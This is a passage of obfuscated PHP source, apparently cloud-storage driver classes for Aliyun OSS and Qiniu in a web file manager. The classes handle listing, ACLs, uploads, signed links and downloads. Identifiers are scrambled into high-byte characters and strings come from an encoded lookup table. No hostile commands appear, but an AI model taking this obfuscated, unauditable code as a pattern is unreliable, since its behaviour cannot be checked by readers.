’¹ù[83]][$‡Â§´Õ˜] = $this->fileInfo($û•ÚåÔò[$ˆã ’¹ù[32]], $¶½¬Ó«, $û•ÚåÔò); } return $á´ôèñ¼; } protected function infoChildren($†ĞÑâæ×, &$ˆßÔ½òÉ) { $Ô¯ë =& $_SERVER[ïëó©ÒÚ]; $ü º¿Ù¢ = $this->fileList($†ĞÑâæ×, $Ô¯ë[12], !0); $ˆßÔ½òÉ[$Ô¯ë[78]] += count($ü º¿Ù¢[$Ô¯ë[82]]); $ˆßÔ½òÉ[$Ô¯ë[77]] += count($ü º¿Ù¢[$Ô¯ë[83]]); foreach ($ü º¿Ù¢[$Ô¯ë[83]] as $©ìÇ„¡Ò) { if (!$©ìÇ„¡Ò || !$©ìÇ„¡Ò[$Ô¯ë[76]]) { continue; } $ˆßÔ½òÉ[$Ô¯ë[76]] += $©ìÇ„¡Ò[$Ô¯ë[76]]; } } public function has($İğ¨÷³, $©Ş¡´ ş = false, $¹Í…ƒáÍ = true) { $Û¯ŸÙÏ³ =& $_SERVER[ïëó©ÒÚ]; $İğ¨÷³ = trim($İğ¨÷³, $Û¯ŸÙÏ³[8]); $Ä‘¹Ì¼¨ = empty($İğ¨÷³) && $İğ¨÷³ !== $Û¯ŸÙÏ³[197] ? $Û¯ŸÙÏ³[12] : $İğ¨÷³ . $Û¯ŸÙÏ³[8]; $û×™™ùƒ = $Û¯ŸÙÏ³[12]; $½ õ©öÏ = 500; $š»ê·š« = $±òÀ’¢ = 0; while (!0) { check_abort(); $·Ñìâ÷ñ = array($Û¯ŸÙÏ³[1396] => $Û¯ŸÙÏ³[8], $Û¯ŸÙÏ³[1397] => $Ä‘¹Ì¼¨, $Û¯ŸÙÏ³[1398] => $½ õ©öÏ, $Û¯ŸÙÏ³[1399] => $û×™™ùƒ); try { $Ò‡°çëÈ = $this->client->listObjects($this->bucket, $·Ñìâ÷ñ); } catch (OSS\Core\OssException $ä°ãš½) { break; } $û×™™ùƒ = $Ò‡°çëÈ->getNextMarker(); $ˆ„Óšìá = $Ò‡°çëÈ->getObjectList(); $ÊÎá™ø„ = $Ò‡°çëÈ->getPrefixList(); if ($©Ş¡´ ş) { if (count($ˆ„Óšìá) > 1 || count($ˆ„Óšìá) == 1 && $ˆ„Óšìá[0]->getKey() != $Ä‘¹Ì¼¨) { $š»ê·š« += count($ˆ„Óšìá) - 1; } if (!empty($ÊÎá™ø„)) { $±òÀ’¢ += count($ÊÎá™ø„); } if ($û×™™ùƒ === $Û¯ŸÙÏ³[12]) { break; } continue; } if ($¹Í…ƒáÍ) { if (!empty($ˆ„Óšìá)) { if (count($ˆ„Óšìá) > 1 || $ˆ„Óšìá[0]->getKey() != $Ä‘¹Ì¼¨) { return !0; } } } else { if (!empty($ÊÎá™ø„)) { return !0; } } if ($û×™™ùƒ === $Û¯ŸÙÏ³[12]) { break; } } if ($©Ş¡´ ş) { return array($Û¯ŸÙÏ³[207] => $š»ê·š«, $Û¯ŸÙÏ³[208] => $±òÀ’¢); } return !1; } public function listAll($¶¯ÚØ²ù) { $âÎ©Ê“Æ =& $_SERVER[ïëó©ÒÚ]; $Ã¹“£¾¤ = $this->fileList($¶¯ÚØ²ù, $âÎ©Ê“Æ[12], !0); $ÊÌóíï = array(); foreach ($Ã¹“£¾¤[$âÎ©Ê“Æ[83]] as $ËİÃŸ¯Ş) { $ÊÌóíï[$ËİÃŸ¯Ş[$âÎ©Ê“Æ[32]]] = $ËİÃŸ¯Ş[$âÎ©Ê“Æ[76]]; } foreach ($Ã¹“£¾¤[$âÎ©Ê“Æ[82]] as $ËİÃŸ¯Ş) { if (is_string($ËİÃŸ¯Ş)) { $ÊÌóíï[$ËİÃŸ¯Ş] = 0; } } return $this->listAllFiles($¶¯ÚØ²ù, array_keys($ÊÌóíï), $ÊÌóíï); } public function canRead($ğŠ©Ë¨Ê) { $í°ÒİùÒ =& $_SERVER[ïëó©ÒÚ]; $¿µ¾±– = $this->pathAcl($ğŠ©Ë¨Ê); return $¿µ¾±– == $í°ÒİùÒ[1409] || $¿µ¾±– == $í°ÒİùÒ[565] ? !0 : !1; } public function canWrite($®¼É™„ó) { $‰€Š†æ³ = $this->pathAcl($®¼É™„ó); return $‰€Š†æ³ == $_SERVER[ïëó©ÒÚ][565] ? !0 : !1; } public function pathAcl($üœöª„) { $Î…ÁõãŒ =& $_SERVER[ïëó©ÒÚ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $µÍß³ª = $this->client->getObjectAcl($this->bucket, $this->pathEncode($üœöª„)); } catch (OSS\Core\OssException $ÚÃñ¬ã) { return !1; } $Ñ¹œÉä = $µÍß³ª == $Î…ÁõãŒ[37] ? $this->bucketAcl : $µÍß³ª; if ($Ñ¹œÉä == $Î…ÁõãŒ[1410]) { return $Î…ÁõãŒ[1409]; } if ($Ñ¹œÉä == $Î…ÁõãŒ[1411]) { return $Î…ÁõãŒ[565]; } return $Ñ¹œÉä; } private function chmodPath($ÙøøØø, $•‰â¬§ì = '') { $®æÃôÃ” =& $_SERVER[ïëó©ÒÚ]; $­ØÒç³œ = empty($•‰â¬§ì) ? $®æÃôÃ”[1411] : $•‰â¬§ì; $‰•²şíú = array($®æÃôÃ”[37], $®æÃôÃ”[198], $®æÃôÃ”[1410], $®æÃôÃ”[1411]); if (!in_array($­ØÒç³œ, $‰•²şíú)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÙøøØø), $­ØÒç³œ); } catch (OSS\Core\OssException $Ù¯ï¢µ£) { return !1; } return !0; } public function getContent($œäîåş) { return $this->fileSubstr($œäîåş, -1); } public function setContent($ÁˆªŒ³, $•³çğ¨­ = '') { $™ÅĞ·Ø£ =& $_SERVER[ïëó©ÒÚ]; try { $ôÚêéıâ = $this->trafficLimit($™ÅĞ·Ø£[1412]); $·ƒÈÄ²´ = $this->client->putObject($this->bucket, $this->pathEncode($ÁˆªŒ³), $•³çğ¨­, $ôÚêéıâ); } catch (OSS\Core\OssException $¾ê¡í¾) { return !1; } $Ò”²¸İ = array($™ÅĞ·Ø£[1402] => trim($·ƒÈÄ²´[$™ÅĞ·Ø£[1413]], $™ÅĞ·Ø£[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÁˆªŒ³))); $this->updateObjMeta($ÁˆªŒ³, $Ò”²¸İ); return isset($·ƒÈÄ²´[$™ÅĞ·Ø£[1414]][$™ÅĞ·Ø£[1361]]) ? !0 : !1; } private function updateObjMeta($—Êì¥Êê, $ğë°Àøê) { $—Êì¥Êê = $this->pathEncode($—Êì¥Êê); try { $ŒÀñí¤« = array(OSS\OssClient::OSS_HEADERS => $ğë°Àøê); $this->client->copyObject($this->bucket, $—Êì¥Êê, $this->bucket, $—Êì¥Êê, $ŒÀñí¤«); } catch (OSS\Core\OssException $´ôÅºãî) { return !1; } return !0; } public function upload($òÃøü­£, $‚àÆƒöÇ, $½è­ = false, $õšº–§ = REPEAT_REPLACE) { $È®‡“ØŒ =& $_SERVER[ïëó©ÒÚ]; $àÊş ì = trim($òÃøü­£, $È®‡“ØŒ[8]); $®óÑ§åÊ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($È®‡“ØŒ[1402] => @md5_file($‚àÆƒöÇ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($òÃøü­£))); $®óÑ§åÊ = $this->trafficLimit($È®‡“ØŒ[1412], $®óÑ§åÊ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($àÊş ì), $‚àÆƒöÇ, $®óÑ§åÊ); } catch (OSS\Core\OssException $Ç¿œßÂ) { return !1; } return $this->getPathOuter($òÃøü­£); } public function getHost() { $‹«¦Éæ… =& $_SERVER[ïëó©ÒÚ]; $¬Ş«ºÂ­ = explode($‹«¦Éæ…[183], parent::getHost()); return $¬Ş«ºÂ­[0] . $‹«¦Éæ…[183] . $this->bucket . $‹«¦Éæ…[10] . $¬Ş«ºÂ­[1]; } public function uploadFormData($ÉËÜ¼œÉ, $±àìÉ¯ó = 3600) { $©ßÁ =& $_SERVER[ïëó©ÒÚ]; if (!($ŒÕ¥¸Œı = $this->getHost())) { return !1; } $ö¸µ‰‹ = $±àìÉ¯ó; $´×‡è = date($©ßÁ[1415], time() + $ö¸µ‰‹); $ãï˜•Á = new DateTime($´×‡è); $‚óŞÆË’ = $ãï˜•Á->format(DateTime::ISO8601); $ÜØïµÀ = strpos($‚óŞÆË’, $©ßÁ[296]); $‚óŞÆË’ = substr($‚óŞÆË’, 0, $ÜØïµÀ) . $©ßÁ[1416]; $¼„€Û“÷ = 1048576000 * 5; $É£³â¢ = $this->pathFather($ÉËÜ¼œÉ); $¶¬¯¸üá = array($©ßÁ[1315] => $‚óŞÆË’, $©ßÁ[1316] => array(array($©ßÁ[1417], 0, $¼„€Û“÷), array($©ßÁ[1319], $©ßÁ[1320], $É£³â¢))); $ÁÆ»Óâ‚ = base64_encode(json_encode($¶¬¯¸üá)); $‘Ñ®ë¤¨ = base64_encode(hash_hmac($©ßÁ[232], $ÁÆ»Óâ‚, $this->secret, !0)); $ûÂïˆ‰ê = array($©ßÁ[1325] => $ÁÆ»Óâ‚, $©ßÁ[1418] => $this->accessKey, $©ßÁ[1321] => $©ßÁ[1313], $©ßÁ[1419] => $‘Ñ®ë¤¨, $©ßÁ[181] => $ŒÕ¥¸Œı); $ûÂïˆ‰ê = $this->trafficLimit($©ßÁ[1412], $ûÂïˆ‰ê); return $ûÂïˆ‰ê; } public function multiUploadFormData($˜Úœ¤ÎĞ, $Ûƒøñ•¨ = 3600) { $Ûã‹îÀĞ =& $_SERVER[ïëó©ÒÚ]; if (!($Ñª‹­ÎÛ = $this->getHost())) { return !1; } $ÇùÖîÚº = $this->trafficLimit($Ûã‹îÀĞ[1412]); $È†¡Ñ‰ö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($˜Úœ¤ÎĞ), $ÇùÖîÚº); return array($Ûã‹îÀĞ[223] => $È†¡Ñ‰ö, $Ûã‹îÀĞ[181] => $Ñª‹­ÎÛ . $Ûã‹îÀĞ[8] . $this->pathEncode($˜Úœ¤ÎĞ), $Ûã‹îÀĞ[224] => gmdate($Ûã‹îÀĞ[1420]), $Ûã‹îÀĞ[94] => $˜Úœ¤ÎĞ); } public function multiUploadAuthData($¹ÓÎõã, $ÔüÊò€Œ = array()) { $Û¢àÑ =& $_SERVER[ïëó©ÒÚ]; $´£Ò™õÊ = isset($ÔüÊò€Œ[$Û¢àÑ[224]]) ? $ÔüÊò€Œ[$Û¢àÑ[224]] : gmdate($Û¢àÑ[1420]); $Ú´ø‡Õ› = isset($ÔüÊò€Œ[$Û¢àÑ[174]]) ? $ÔüÊò€Œ[$Û¢àÑ[174]] : $Û¢àÑ[12]; $¬Ÿ¸õÖ = $¹ÓÎõã; if (isset($ÔüÊò€Œ[$Û¢àÑ[94]])) { $¬Ÿ¸õÖ = $ÔüÊò€Œ[$Û¢àÑ[94]]; unset($ÔüÊò€Œ[$Û¢àÑ[94]]); } if (isset($ÔüÊò€Œ[$Û¢àÑ[225]])) { $ÔüÊò€Œ[$Û¢àÑ[224]] = $´£Ò™õÊ; return $this->listUploadParts($¬Ÿ¸õÖ, $ÔüÊò€Œ); } $¬¤ĞÏı‰ = array($Û¢àÑ[226], $Û¢àÑ[12], $Û¢àÑ[120], $´£Ò™õÊ, "\x78\x2d\157\x73\163\55\x64\x61\x74\145\72{$´£Ò™õÊ}", $Û¢àÑ[8] . $this->bucket . $Û¢àÑ[8] . $¬Ÿ¸õÖ . $Ú´ø‡Õ›); if (strpos($Ú´ø‡Õ›, $Û¢àÑ[227]) === 0) { $¬¤ĞÏı‰[0] = $Û¢àÑ[228]; if ($ıç†¹÷‹ = $this->trafficLimit($Û¢àÑ[1412])) { $¬Ÿ¸õÖ = $Û¢àÑ[1421]; array_splice($¬¤ĞÏı‰, 5, 0, $¬Ÿ¸õÖ . $Û¢àÑ[4] . $ıç†¹÷‹[$¬Ÿ¸õÖ]); } } if (isset($ÔüÊò€Œ[$Û¢àÑ[229]]) && $ÔüÊò€Œ[$Û¢àÑ[229]] == $Û¢àÑ[230]) { $¬¤ĞÏı‰[0] = $Û¢àÑ[230]; } if (!empty($ÔüÊò€Œ[$Û¢àÑ[1422]])) { $ÑêŞíã¸ = array_merge(array($¬¤ĞÏı‰[4]), $ÔüÊò€Œ[$Û¢àÑ[1422]]); sort($ÑêŞíã¸); $¬¤ĞÏı‰[4] = implode($Û¢àÑ[231], $ÑêŞíã¸); } $«¤í—Õ = implode($Û¢àÑ[231], $¬¤ĞÏı‰); $ŞÚçÅî = base64_encode(hash_hmac($Û¢àÑ[232], $«¤í—Õ, $this->secret, !0)); $Ã¬¾áÚÛ = $Û¢àÑ[1386] . $this->accessKey . $Û¢àÑ[4] . $ŞÚçÅî; if (strpos($Ú´ø‡Õ›, $Û¢àÑ[227]) === 0) { $Ã¬¾áÚÛ = array($Û¢àÑ[234] => $Ã¬¾áÚÛ, $Û¢àÑ[224] => $´£Ò™õÊ); if ($ıç†¹÷‹) { $Ã¬¾áÚÛ = array_merge($Ã¬¾áÚÛ, $ıç†¹÷‹); } } return $Ã¬¾áÚÛ; } public function listUploadParts($¶²É®Ì, $¼‹”¸Î‰) { $Ù‚ù¼òÇ =& $_SERVER[ïëó©ÒÚ]; $å–„Õ¨® = parse_url_query($¼‹”¸Î‰[$Ù‚ù¼òÇ[174]]); $ÜßŠ±¿º = $this->client->listParts($this->bucket, $this->pathEncode($¶²É®Ì), $å–„Õ¨®[$Ù‚ù¼òÇ[223]]); $ªÂÇÔ‡ = $ÜßŠ±¿º->getListPart(); $ºÄ· ¼ = array(); foreach ($ªÂÇÔ‡ as $‰›âÃš) { $ºÄ· ¼[] = array($Ù‚ù¼òÇ[1406] => $‰›âÃš->getPartNumber(), $Ù‚ù¼òÇ[1407] => trim($‰›âÃš->getETag(), $Ù‚ù¼òÇ[118])); } unset($¼‹”¸Î‰[$Ù‚ù¼òÇ[225]], $¼‹”¸Î‰[$Ù‚ù¼òÇ[229]]); $ÛƒˆöÄß = $this->multiUploadAuthData($¶²É®Ì, $¼‹”¸Î‰); if (empty($ÛƒˆöÄß)) { return !1; } return array($Ù‚ù¼òÇ[234] => $ÛƒˆöÄß, $Ù‚ù¼òÇ[224] => $¼‹”¸Î‰[$Ù‚ù¼òÇ[224]], $Ù‚ù¼òÇ[236] => $ºÄ· ¼); } public function download($€Ğ©ÎÄ—, $‡ˆäƒ‹) { if ($this->isFolder($€Ğ©ÎÄ—)) { return !1; } try { $˜º¨§í = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $‡ˆäƒ‹); $˜º¨§í = $this->trafficLimit($_SERVER[ïëó©ÒÚ][109], $˜º¨§í); $this->client->getObject($this->bucket, $this->pathEncode($€Ğ©ÎÄ—), $˜º¨§í); } catch (OSS\Core\OssException $‹“¿–šê) { return !1; } return $‡ˆäƒ‹; } public function fileSubstr($Çûò’„ú, $ù´éÕ˜… = 0, $»ÅÂê¡Ó = false) { if ($ù´éÕ˜… === -1) { $Ô˜ı§òİ = array(); } else { if ($»ÅÂê¡Ó === !1) { $ŸšÔ”õ¸ = $this->size($Çûò’„ú); } else { $ŸšÔ”õ¸ = $ù´éÕ˜… + $»ÅÂê¡Ó - 1; } $Ô˜ı§òİ = array(OSS\OssClient::OSS_RANGE => "{$ù´éÕ˜…}\55{$ŸšÔ”õ¸}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Çûò’„ú), $Ô˜ı§òİ); } catch (OSS\Core\OssException $¦æÓÅí) { think_exception($¦æÓÅí->getMessage()); return !1; } } private function trafficLimit($® ¥ª¦™, $öÑ¸•©º = array()) { $ä¯“º—Ä =& $_SERVER[ïëó©ÒÚ]; if ($® ¥ª¦™ == $ä¯“º—Ä[1412] && $this->isUploadServer() || $® ¥ª¦™ == $ä¯“º—Ä[109] && $this->isFileOutServer()) { return $öÑ¸•©º; } $øÄÜã = floatval($GLOBALS[$ä¯“º—Ä[6]][$ä¯“º—Ä[89]][$ä¯“º—Ä[107]][$® ¥ª¦™]) * 1024 * 1024 * 8; if (!$øÄÜã) { return $öÑ¸•©º; } $øÄÜã = $øÄÜã < 819200 ? 819200 : ($øÄÜã > 838860800 ? 838860800 : $øÄÜã); $öÑ¸•©º[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($øÄÜã); return $öÑ¸•©º; } public function link($Ÿ’²Ó‘, $—Ö±Úë = array()) { $¬›‘û¯ =& $_SERVER[ïëó©ÒÚ]; if (!$this->exist($Ÿ’²Ó‘) || $this->isFolder($Ÿ’²Ó‘)) { return !1; } try { $—Ö±Úë = $this->trafficLimit($¬›‘û¯[109], $—Ö±Úë); $±‡ğÚ¦è = $this->client->signUrl($this->bucket, $this->pathEncode($Ÿ’²Ó‘), 3600 * 12, $¬›‘û¯[230], $—Ö±Úë); return $this->getCdnLink($±‡ğÚ¦è); } catch (OSS\Core\OssException $îä¿§»ò) { return !1; } } public function fileOut($õºßŠ, $ñèİªÓ› = false, $‚‡µ¸ı = false, $©ğµËŸÈ = '') { $ßã†ˆÅÔ =& $_SERVER[ïëó©ÒÚ]; if ($this->isFileOutServer()) { return $this->fileOutServer($õºßŠ, $ñèİªÓ›, $‚‡µ¸ı, $©ğµËŸÈ); } if (!$‚‡µ¸ı) { $‚‡µ¸ı = $this->pathThis($õºßŠ); } $‚‡µ¸ı = rawurlencode($‚‡µ¸ı); $†ä­´¥Æ = get_file_mime(get_path_ext($‚‡µ¸ı)); if ($†ä­´¥Æ == $ßã†ˆÅÔ[217]) { return parent::fileOut($õºßŠ, $ñèİªÓ›, $‚‡µ¸ı, $©ğµËŸÈ); } $ñèİªÓ› = $ñèİªÓ› ? $ßã†ˆÅÔ[1423] : $ßã†ˆÅÔ[1424]; $ş¡ÂÌÆ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ßã†ˆÅÔ[1425] . rawurlencode("{$ñèİªÓ›}\x3b\146\151\154\x65\156\141\155\x65\75{$‚‡µ¸ı}")); $ş¡ÂÌÆ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ßã†ˆÅÔ[1426] . rawurlencode($†ä­´¥Æ); $‚ñ¹Ç = $this->link($õºßŠ, $ş¡ÂÌÆ); $this->fileOutLink($‚ñ¹Ç); } public function fileOutServer($à¼‡¨Æ, $ºÉÚ—³À = false, $ÑÂâõ¤Ê = false, $äşéØ“ = '') { parent::fileOut($à¼‡¨Æ, $ºÉÚ—³À, $ÑÂâõ¤Ê, $äşéØ“); } public function fileOutImage($ƒÈùô¤, $›¹ıõÌÄ = 250) { $Ö¦ĞÚù = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ïëó©ÒÚ][1427] . $›¹ıõÌÄ); $…œîïÜÙ = $this->link($ƒÈùô¤, $Ö¦ĞÚù); $this->fileOutLink($…œîïÜÙ); } public function fileOutImageServer($ıÎ¯•…ß, $éáµÜßÔ = 250) { parent::fileOutImage($ıÎ¯•…ß, $éáµÜßÔ); } public function fileOutLink($€Æ©–¹ƒ) { $•óúÏ”ê =& $_SERVER[ïëó©ÒÚ]; if (!$this->isCdnHost() && substr($€Æ©–¹ƒ, 0, 7) == $•óúÏ”ê[1328]) { $€Æ©–¹ƒ = $•óúÏ”ê[1329] . substr($€Æ©–¹ƒ, 7); } header($•óúÏ”ê[161] . $€Æ©–¹ƒ); die; } public function hashMd5($ùòçåñá, $ûù´‰²ú = '') { $êøõ†Ïœ =& $_SERVER[ïëó©ÒÚ]; $ñ÷ÄœÛñ = $this->_objectMeta($ùòçåñá); if (!$ñ÷ÄœÛñ) { return $êøõ†Ïœ[12]; } if (!isset($ñ÷ÄœÛñ[$êøõ†Ïœ[1402]]) && !empty($ûù´‰²ú)) { $‡§ÎËÍ™ = $this->updateObjMeta($ùòçåñá, array($êøõ†Ïœ[1402] => $ûù´‰²ú)); $ñ÷ÄœÛñ[$êøõ†Ïœ[1402]] = $‡§ÎËÍ™ ? $ûù´‰²ú : $êøõ†Ïœ[12]; } return isset($ñ÷ÄœÛñ[$êøõ†Ïœ[1402]]) ? strtolower($ñ÷ÄœÛñ[$êøõ†Ïœ[1402]]) : $êøõ†Ïœ[12]; } public function size($¹æ®‚’¨) { $ºğæ× = $this->objectMeta($¹æ®‚’¨); return $ºğæ× ? $ºğæ×[$_SERVER[ïëó©ÒÚ][76]] : 0; } public function info($¤ÓğÒ±) { if ($this->isFolder($¤ÓğÒ±)) { return $this->folderInfo($¤ÓğÒ±); } else { if ($this->isFile($¤ÓğÒ±)) { return $this->fileInfo($¤ÓğÒ±); } } return !1; } public function exist($¹Âáƒœä) { return $this->isFile($¹Âáƒœä) || $this->isFolder($¹Âáƒœä); } public function isFile($©Ÿ‰æ—Ì) { return !$this->isFolder($©Ÿ‰æ—Ì) && $this->objectMeta($©Ÿ‰æ—Ì); } public function isFolder($õãı„æ) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][165], $õãı„æ); } protected function objectMeta($Ââıôï) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][167], $Ââıôï); } protected function _objectMeta($áÛğàÑÙ) { $×‘†Õ²½ =& $_SERVER[ïëó©ÒÚ]; try { $™¤Å›Õ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($áÛğàÑÙ)); } catch (OSS\Core\OssException $ÃÛí½Š¦) { $™¤Å›Õ = !1; } if ($™¤Å›Õ) { $™¤Å›Õ[$×‘†Õ²½[76]] = intval($™¤Å›Õ[$×‘†Õ²½[1400]]); } return $™¤Å›Õ; } protected function _isFolder($Š«à‘áç) { $ñÁ‹Ÿ·¾ =& $_SERVER[ïëó©ÒÚ]; if ($Š«à‘áç == $ñÁ‹Ÿ·¾[12] || $Š«à‘áç == $ñÁ‹Ÿ·¾[8]) { return !0; } $ôÒŞ…Ë® = array($ñÁ‹Ÿ·¾[1396] => $ñÁ‹Ÿ·¾[8], $ñÁ‹Ÿ·¾[1397] => rtrim($Š«à‘áç, $ñÁ‹Ÿ·¾[8]) . $ñÁ‹Ÿ·¾[8], $ñÁ‹Ÿ·¾[1398] => 1, $ñÁ‹Ÿ·¾[1399] => $ñÁ‹Ÿ·¾[12]); $«­ò€ˆ´ = $this->client->listObjects($this->bucket, $ôÒŞ…Ë®); if ($«­ò€ˆ´->getObjectList() || $«­ò€ˆ´->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Š÷¯­Û) { parent::__construct(); require_once SDK_DIR . $_SERVER[ïëó©ÒÚ][1428]; $this->_init($Š÷¯­Û); } public function _init($—å¨„µ‹) { $¥ä™î­ø =& $_SERVER[ïëó©ÒÚ]; foreach ($—å¨„µ‹ as $™îÑúÄ– => $š¢“–Ê) { if (isset($this->{$™îÑúÄ–})) { $this->{$™îÑúÄ–} = $š¢“–Ê; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¥ä™î­ø[1429] . LNG($¥ä™î­ø[1387])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Å—©íø, $öµŠÕ¨ = '', $ëÜÄ¾ÄŸ = REPEAT_RENAME) { if ($this->setContent($Å—©íø, $öµŠÕ¨)) { return $this->getPathOuter($Å—©íø); } return !1; } public function mkdir($…ıšÊŞ, $Å¶›¡¹È = REPEAT_SKIP) { $äÑÚĞı„ =& $_SERVER[ïëó©ÒÚ]; $ô—ñıÍ± = trim($…ıšÊŞ, $äÑÚĞı„[8]); if ($this->_isFolder($ô—ñıÍ±)) { return $this->getPathOuter($ô—ñıÍ±); } $…ıšÊŞ = $ô—ñıÍ± . $äÑÚĞı„[8]; $°ÌÃ–²˜ = get_path_this($ô—ñıÍ±); $«ç®â’® = $…ıšÊŞ . $°ÌÃ–²˜; if (!$this->mkfile($«ç®â’®)) { return !1; } if (!$this->moveFile($«ç®â’®, $…ıšÊŞ)) { $this->delFile($«ç®â’®); return !1; } return $this->getPathOuter($ô—ñıÍ±); } public function copyFile($ÃØßÅ°õ, $åĞğØæ) { $Í¬ÃªÛÊ = $this->bucketManager->copy($this->bucket, $ÃØßÅ°õ, $this->bucket, $åĞğØæ, !0); return $Í¬ÃªÛÊ ? !1 : $this->getPathOuter($åĞğØæ); } public function moveFile($Õş¹¤ªå, $»„…õı¨) { $­ÌÓŒ¡Ñ = $this->bucketManager->move($this->bucket, $Õş¹¤ªå, $this->bucket, $»„…õı¨, !0); return $­ÌÓŒ¡Ñ ? !1 : $this->getPathOuter($»„…õı¨); } public function delFile($´îÊ›ÀÊ) { if (!$this->exist($´îÊ›ÀÊ)) { return !0; } $Ìâ‘‚‘‹ = $this->bucketManager->delete($this->bucket, $´îÊ›ÀÊ); return $Ìâ‘‚‘‹ ? !1 : !0; } public function delFolder($Şë“âÀ) { $òŞ‚‡›Ú =& $_SERVER[ïëó©ÒÚ]; if (!$this->exist($Şë“âÀ)) { return !0; } $this->listItemCache = !1; $Ã¢ıãÒ = $this->fileList($Şë“âÀ); $this->listItemCache = !0; $Ú·ëÖ¿â = trim($Şë“âÀ, $òŞ‚‡›Ú[8]) . $òŞ‚‡›Ú[8]; if (!empty($Şë“âÀ) && $Şë“âÀ !== $òŞ‚‡›Ú[197] && !in_array($Ú·ëÖ¿â, $Ã¢ıãÒ[$òŞ‚‡›Ú[82]])) { $Ã¢ıãÒ[$òŞ‚‡›Ú[82]][] = $Ú·ëÖ¿â; } $×°‰—Ö™ = $this->delByBatch($Ã¢ıãÒ[$òŞ‚‡›Ú[83]]); if (!$×°‰—Ö™) { return !1; } $×°‰—Ö™ = $this->delByBatch($Ã¢ıãÒ[$òŞ‚‡›Ú[82]]); if (!$×°‰—Ö™) { return !1; } return $this->delFile($Ú·ëÖ¿â); } private function delByBatch($ì¹—áªÍ) { foreach (array_chunk($ì¹—áªÍ, 1000) as $ğ‡§¢ñŠ) { $ÃºÊİ†¸ = $this->bucketManager->buildBatchDelete($this->bucket, $ğ‡§¢ñŠ); list($Øª³“Ñò, $‰ş…ÔØ) = $this->bucketManager->batch($ÃºÊİ†¸); if ($‰ş…ÔØ) { return !1; } } return !0; } public function rename($Õô®‰üâ, $¢ÊĞÆ›â) { return $this->renameObject($Õô®‰üâ, $¢ÊĞÆ›â); } public function fileInfo($İçÚ‘Ù, $Ğ˜÷®ğê = false, $Ä¢´Û£ì = array()) { $’âÌø–Ã =& $_SERVER[ïëó©ÒÚ]; $¶ó˜Ìî = array($’âÌø–Ã[32] => $this->pathThis($İçÚ‘Ù), $’âÌø–Ã[84] => $this->getPathOuter($’âÌø–Ã[8] . $İçÚ‘Ù), $’âÌø–Ã[33] => $’âÌø–Ã[199], $’âÌø–Ã[76] => isset($Ä¢´Û£ì[$’âÌø–Ã[1430]]) ? $Ä¢´Û£ì[$’âÌø–Ã[1430]] : 0, $’âÌø–Ã[174] => $this->ext($İçÚ‘Ù)); if ($Ğ˜÷®ğê) { return $¶ó˜Ìî; } $¶ó˜Ìî[$’âÌø–Ã[200]] = $¶ó˜Ìî[$’âÌø–Ã[85]] = 0; $¶ó˜Ìî[$’âÌø–Ã[201]] = $¶ó˜Ìî[$’âÌø–Ã[202]] = !0; if (empty($Ä¢´Û£ì)) { $Ä¢´Û£ì = $this->objectMeta($İçÚ‘Ù); if (!$Ä¢´Û£ì) { return $¶ó˜Ìî; } } if (isset($Ä¢´Û£ì[$’âÌø–Ã[1431]])) { $¶ó˜Ìî[$’âÌø–Ã[85]] = substr($Ä¢´Û£ì[$’âÌø–Ã[1431]] . $’âÌø–Ã[12], 0, 10); } if (isset($Ä¢´Û£ì[$’âÌø–Ã[1430]])) { $¶ó˜Ìî[$’âÌø–Ã[76]] = $Ä¢´Û£ì[$’âÌø–Ã[1430]]; } return $¶ó˜Ìî; } public function folderInfo($†Ğùê¥·, $ÕÈÕè£² = false) { $™ë–¶¯ì =& $_SERVER[ïëó©ÒÚ]; $ƒÕÂØŠƒ = array($™ë–¶¯ì[32] => $this->pathThis($†Ğùê¥·), $™ë–¶¯ì[84] => $this->getPathOuter($™ë–¶¯ì[8] . $†Ğùê¥·), $™ë–¶¯ì[33] => $™ë–¶¯ì[75]); if ($ÕÈÕè£²) { return $ƒÕÂØŠƒ; } $ƒÕÂØŠƒ[$™ë–¶¯ì[200]] = $ƒÕÂØŠƒ[$™ë–¶¯ì[85]] = 0; $ƒÕÂØŠƒ[$™ë–¶¯ì[201]] = $ƒÕÂØŠƒ[$™ë–¶¯ì[202]] = !0; $†Ğùê¥· = rtrim($†Ğùê¥·, $™ë–¶¯ì[8]) . $™ë–¶¯ì[8]; $ŠÍ”³ûô = $this->objectMeta($†Ğùê¥·); if (isset($ŠÍ”³ûô[$™ë–¶¯ì[1431]])) { $ƒÕÂØŠƒ[$™ë–¶¯ì[85]] = substr($ŠÍ”³ûô[$™ë–¶¯ì[1431]] . $™ë–¶¯ì[12], 0, 10); } return $ƒÕÂØŠƒ; } public function listPath($–Ğ‰êì, $ÑÏë‹ğË = false) { $±ø¾¶ä¾ =& $_SERVER[ïëó©ÒÚ]; $ì­˜œÙ = $this->fileList($–Ğ‰êì, 